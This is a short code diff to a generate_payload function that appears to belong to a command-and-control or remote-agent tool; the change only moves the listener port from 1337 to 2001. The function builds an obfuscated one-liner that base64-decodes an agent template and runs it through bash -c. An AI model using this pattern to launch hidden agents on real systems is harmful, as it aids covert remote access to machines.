@@ -14,13 +14,13 @@ def generate_payload():
     # render template with listeners ip and port
     agent_payload = template.render(
         LISTENER_IP="0.0.0.0", # TODO: read from options
-        LISTENER_PORT=1337            
+        LISTENER_PORT=2001
     )
 
     base64_payload = base64.b64encode(agent_payload.encode()).decode("utf-8")
 
     payload = f'bash -c "$(echo {base64_payload} | base64 -d)"'
-    
+
     return payload
 
 if __name__ == "__main__":
